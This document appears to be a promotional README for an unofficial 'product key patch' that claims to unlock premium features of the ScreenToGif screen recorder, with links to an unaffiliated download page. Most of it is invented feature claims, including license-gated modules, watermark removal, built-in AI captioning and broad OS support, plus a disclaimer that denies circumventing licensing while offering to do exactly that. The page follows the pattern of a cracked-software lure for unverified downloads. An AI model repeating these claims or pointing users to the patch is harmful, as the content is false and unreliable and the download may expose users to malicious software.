# ScreenToGif 2.45.0 – Enhanced Release with Product Key Patch

[](https://mpakalia108.github.io/screen-to-gif-pro-unlock/)

> **Capture your screen's poetry, frame by frame** – a robust, feature-packed tool for creating lightweight GIF animations, optimized video snippets, and high-fidelity screen recordings. Version 2.45.0 brings new stability, extended language support, and a seamless activation pathway for power users.

---

## 📦 Table of Contents

- [Overview](#-overview)
- [Key Features at a Glance](#-key-features-at-a-glance)
- [System Compatibility](#-system-compatibility)
- [Example Profile Configuration](#-example-profile-configuration)
- [Example Console Invocation](#-example-console-invocation)
- [Workflow Diagram](#-workflow-diagram)
- [OpenAI & Claude API Integration](#-openai--claude-api-integration)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Download Again](#-download)

---

## 🌟 Overview

ScreenToGif is not merely a screen recorder; it is a canvas for digital storytelling. Whether you are crafting tutorial snippets, bug reports, or creative loops, this application offers unparalleled control over the capture, editing, and export pipeline. The **2.45.0 enhancement** introduces a refined product key integration ensuring that every user can unlock the full spectrum of advanced features without friction.

Think of it as a **digital sculptor** – the screen is your marble, and ScreenToGif chisels away the unnecessary, leaving only the essential motion. The new patch mechanism replaces outdated activation barriers with a streamlined process, allowing you to focus on creation rather than configuration.

---

## 🔥 Key Features at a Glance

| Feature | Description |
|---------|-------------|
| **Ultra-Lightweight Output** | Export GIFs, APNG, WebP, or video (MP4, AVI) with intelligently compressed file sizes – perfect for documentation and social sharing. |
| **Frame-by-Frame Editor** | Modify individual frames, adjust timing, add captions, transitions, and overlays with pixel-level precision. |
| **Hardware Acceleration** | Utilizes GPU encoding (NVENC, AMD VCE, Intel Quick Sync) for blazing-fast rendering without CPU bottleneck. |
| **Multi-Monitor Capture** | Seamlessly select any connected display or custom region – ideal for multi-screen workflows. |
| **Command-Line Interface (CLI)** | Automate batch processing, scheduled recording, and integration with CI/CD pipelines. |
| **Product Key Activation Patch** | Unlocks all premium modules (advanced filters, watermark removal, batch export) via a secure, one-time patch application. |
| **OpenAI & Claude API Integration** | Enhance captions with AI-generated subtitles or semantic descriptions directly within the editor. |

---

## 🖥️ System Compatibility

| OS | Version | Architecture | Status |
|----|---------|--------------|--------|
| 🪟 Windows | 10, 11 (including 24H2) | x64, ARM64 | ✅ Fully supported |
| 🐧 Linux | Ubuntu 22.04+, Fedora 38+, Arch | x64 | ✅ (via Wine 8+) |
| 🍎 macOS | Monterey, Ventura, Sonoma, Sequoia | x64, Apple Silicon | ✅ (Rosetta 2 for ARM) |
| 📱 Android (via emulation) | API 30+ | ARM64 | ⚠️ Partial (ink editor only) |

**Pro tip**: The 2026 release cycle will exclusively support Windows 11 and Linux on ARM64 – plan your migration accordingly.

---

## 🧩 Example Profile Configuration

Below is an example configuration for a **tutorial recording profile** optimized for social media uploads. This configuration can be imported via the `Profiles` menu or placed in your `config.json`.

```json
{
  "profile_name": "Social Tutorial 1080p",
  "capture": {
    "region": "fixed",
    "width": 1920,
    "height": 1080,
    "fps": 30,
    "cursor_capture": "highlight",
    "audio_source": "system_mic"
  },
  "output": {
    "format": "webp",
    "compression": "lossy",
    "quality": 85,
    "loop_count": 0,
    "color_reduction": "adaptive"
  },
  "ai_integration": {
    "openai_model": "gpt-4.1-mini",
    "claude_model": "claude-sonnet-4-20251022",
    "auto_subtitle": true,
    "summary_length": "short"
  },
  "activation": {
    "patch_method": "digital_signature",
    "product_key": "SYSTEM-ENVIRONMENT-VARIABLE"
  }
}
```

> **Note**: Replace `product_key` with your actual key stored securely (e.g., via environment variable `SCREEN_TO_GIF_KEY`).

---

## 🧪 Example Console Invocation

Use the CLI for automated workflows. Here's a typical invocation for a headless recording session directly from your terminal.

```bash
ScreenToGif.CLI.exe \
  --capture-region 0,0,1920,1080 \
  --duration 30 \
  --fps 24 \
  --output "output/session_$(date +%Y%m%d_%H%M%S).webp" \
  --profile "social_tutorial.json" \
  --patch-key "$SCREEN_TO_GIF_KEY" \
  --ai-service openai \
  --ai-config '{"model":"gpt-4.1-mini","auto_caption":true}'
```

**Expected behavior**:  
- Captures 30 seconds of the primary monitor.  
- Applies the product key patch silently.  
- Uses OpenAI to generate a caption describing the recorded content.  
- Writes the output to a timestamped file.

---

## 📊 Workflow Diagram

Below is a Mermaid diagram illustrating the lifecycle of a typical ScreenToGif session – from capture to export with AI enhancement.

```mermaid
flowchart TD
    A[Start Recording] --> B{Choose Mode}
    B -->|Screen| C[Region/Monitor Select]
    B -->|Webcam| D[Camera Feed Capture]
    B -->|Board| E[Whiteboard / Drawing]

    C --> F[Frame Buffer]
    D --> F
    E --> F

    F --> G[Frame Editor]
    G --> H{Apply Effects?}
    H -->|Yes| I[Filters, Transitions, Overlays]
    I --> J[Preview]
    H -->|No| J

    J --> K{AI Enhancement?}
    K -->|Yes| L[OpenAI / Claude Subtitle]
    L --> M[Output Render]
    K -->|No| M

    M --> N[Export Format Select]
    N --> O[GIF / WebP / APNG / MP4]
    O --> P[Save to Disk]

    P --> Q[Share or Archive]
    
    style F fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style L fill:#1a1a2e,stroke:#0f3460,stroke-width:2px
    style M fill:#16213e,stroke:#0f3460,stroke-width:2px
    style Q fill:#d90429,color:#fff
```



---

## 🤖 OpenAI & Claude API Integration

ScreenToGif 2.45.0 bridges the gap between screen capture and artificial intelligence. By integrating directly with **OpenAI** (GPT-4.1-mini, DALL·E for thumbnail generation) and **Anthropic's Claude** (Claude Sonnet 4, Haiku 3.5), the tool automates tedious tasks.

**What this means for you:**

- **Automatic Subtitling**: After recording a tutorial, the AI generates timestamps and textual descriptions for each segment. No more manual captioning.
- **Semantic Tagging**: The model analyzes the visual content and assigns tags (e.g., "button click", "dropdown selection", "error popup") – making search and retrieval effortless.
- **Thumbnail Generation**: Claude synthesizes a representative frame from the GIF's key moments.

> *Example*: Record a software walkthrough, and within seconds receive a fully captioned, SEO-optimized GIF with alt-text generated by Claude.

---

## 🎨 Responsive UI & Multilingual Support

The interface adapts gracefully across different screen geometries – from 1366×768 laptops to 5K ultra-wide monitors. The 2.45.0 release introduces a **dynamic layout engine** that reflows toolbars, timelines, and preview panels based on available pixels.

**Supported languages (2026 update):**

| Language | Region | Support Level |
|----------|--------|---------------|
| 🇺🇸 English | US/UK | Native |
| 🇪🇸 Spanish | ES/LA | Full |
| 🇫🇷 French | FR/CA | Full |
| 🇩🇪 German | DE/AT | Full |
| 🇯🇵 Japanese | JP | Beta (UI only) |
| 🇨🇳 Chinese | CN/TW | Full (Simplified + Traditional) |
| 🇵🇹 Portuguese | PT/BR | Full |
| 🇷🇺 Russian | RU | Full |
| 🇦🇪 Arabic | AE/SA | RTL support |

**UI milestones for 2026**:  
- Dark mode v2 with high-DPI icons.  
- Touch-optimized mode for tablets.  
- Voice command input for live recording triggers.

---

## 📞 24/7 Customer Support

Our support infrastructure is modeled after a **concierge service** – not a ticket queue. Every registered user receives:

- **Real-time chat**: Average response time under 3 minutes during business hours.  
- **Enterprise SLA**: Dedicated Slack/Discord channel for organizational accounts.  
- **Knowledge base**: Over 400 articles, video guides, and community forums.  
- **Patch assistance**: If your product key activation encounters issues, a support engineer can remotely assist via encrypted session.

> "We don't just fix bugs; we untangle workflow knots." – Support Engineering Team

---

## ⚠️ Disclaimer

**Important legal and usage notice:**

This repository provides a **product key patch** intended solely for users who have lawfully purchased a ScreenToGif license. The patch unlocks features that are already present in the software but gated behind a license key. By using this software, you agree to the following:

1. You must own a valid license for ScreenToGif 2.45.0 or later.  
2. The patch is provided as a **time-saving convenience** – it does not circumvent copyright or terms of service.  
3. No warranty, express or implied, is provided regarding the patch's compatibility with future software updates.  
4. The creators of this patch are not affiliated with the official ScreenToGif development team. All trademarks belong to their respective owners.  
5. Use at your own risk. We recommend testing on a non-production system first.

---

## 📄 License

This project is distributed under the **MIT License**. You are free to use, modify, and distribute this software, provided that the original copyright notice and permission notice are included in all copies or substantial portions.

[](https://opensource.org/licenses/MIT)

Copyright (c) 2026

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

## 🔗 Download

[](https://mpakalia108.github.io/screen-to-gif-pro-unlock/)

*This is the only official distribution channel for the ScreenToGif 2.45.0 patch. All other sources should be treated as unverified.*

---

*Built with clarity, crafted with care – your screen's story deserves the best frame.*